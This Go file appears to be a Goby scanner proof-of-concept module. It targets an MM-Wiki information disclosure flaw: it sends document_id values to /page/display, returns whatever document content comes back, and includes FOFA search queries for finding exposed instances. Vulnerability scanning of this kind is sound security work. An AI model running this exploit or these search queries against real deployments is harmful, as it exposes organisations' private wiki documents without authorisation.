package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MM-Wiki /page/display file document_id parameter information disclosure vulnerability",
    "Description": "<p>MM-Wiki is a lightweight enterprise knowledge sharing and team collaboration software that can be used to quickly build enterprise Wikis and team knowledge sharing platforms. Easy to deploy and easy to use, it helps teams build a collaborative environment for information sharing and document management.</p><p>The attacker reads sensitive system information by constructing a special URL address.</p>",
    "Product": "MM-Wiki",
    "Homepage": "https://github.com/phachon/MM-Wiki",
    "DisclosureDate": "2023-03-06",
    "Author": "715827922@qq.com",
    "FofaQuery": "title=\"MM-Wiki\" || header=\"mmwikissid\" || banner=\"mmwikissid\"",
    "GobyQuery": "title=\"MM-Wiki\" || header=\"mmwikissid\" || banner=\"mmwikissid\"",
    "Level": "2",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://github.com/phachon/MM-Wiki\">https://github.com/phachon/MM-Wiki</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "id",
            "type": "input",
            "value": "1",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "MM-Wiki /page/display 文件 document_id 参数信息泄露漏洞",
            "Product": "MM-Wiki",
            "Description": "<p>MM-Wiki 一个轻量级的企业知识分享与团队协同软件，可用于快速构建企业 Wiki 和团队知识分享平台。部署方便，使用简单，帮助团队构建一个信息共享、文档管理的协作环境。<br></p><p>攻击者通过构造特殊 URL 地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/phachon/MM-Wiki\">https://github.com/phachon/MM-Wiki</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "MM-Wiki /page/display file document_id parameter information disclosure vulnerability",
            "Product": "MM-Wiki",
            "Description": "<p>MM-Wiki is a lightweight enterprise knowledge sharing and team collaboration software that can be used to quickly build enterprise Wikis and team knowledge sharing platforms. Easy to deploy and easy to use, it helps teams build a collaborative environment for information sharing and document management.</p><p>The attacker reads sensitive system information by constructing a special URL address.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://github.com/phachon/MM-Wiki\">https://github.com/phachon/MM-Wiki</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-30",
    "PocId": "10832"
}`
	sendIdPayload12adsnwalk := func(hostInfo *httpclient.FixUrl, id string) (*httpclient.HttpResponse, error) {
		if id == "" {
			id = "-1"
		}
		getRequestConfig := httpclient.NewGetRequestConfig("/page/display?document_id=" + id)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		return response, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			response, err := sendIdPayload12adsnwalk(hostInfo, "")
			if err != nil {
				return false
			}
			return strings.Contains(response.Utf8Html, "很抱歉，文档不存在！") && response.StatusCode == 200
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			id := goutils.B2S(ss.Params["id"])
			response, err := sendIdPayload12adsnwalk(expResult.HostInfo, id)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if len(response.Utf8Html) > 0 && response.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = response.Utf8Html
			}
			return expResult
		},
	))
}
